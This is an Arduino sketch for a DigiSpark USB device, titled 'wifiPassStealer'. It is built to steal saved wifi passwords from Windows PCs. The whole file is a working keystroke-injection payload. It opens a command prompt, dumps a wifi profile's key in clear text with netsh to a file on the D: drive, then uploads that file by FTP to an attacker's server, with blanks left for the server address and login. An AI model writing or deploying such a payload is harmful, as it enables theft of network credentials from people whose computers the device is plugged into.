/*
 * Date: 13.06.2018
 * Author: __z01db3rg
 * Title: wifiPassStealer
 * Description: Using an arduino DigiSpark gets the wifi passwd of a wifi
 * that was connected with the pc in which we insert the DigiSpark
 * Compatibility: win10/win7
 * Variables for integration with what you want:
 * All commented in the patload
 * !!!IMPORTANT -> for this payload you need to use a ftp server ->
 * there s where the data will be sent
 */
 
#include "DigiKeyboard.h"

int delayPause(1000);

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  //put the name of the wifi network you want instead of WIFI_NETWORK
  DigiKeyboard.print("netsh wlan show profile WIFI_NETWORK key = clear > D:\\wifi01.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);

  DigiKeyboard.print("ftp "); //put the server's ip addr here next to ftp
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);

  DigiKeyboard.print("");//put the user here
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print("");//put the passwd here
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);  

  DigiKeyboard.print("put D:\\wifi01.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);

  DigiKeyboard.print("quit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);  
  for(;;){ /*empty*/ }    
}
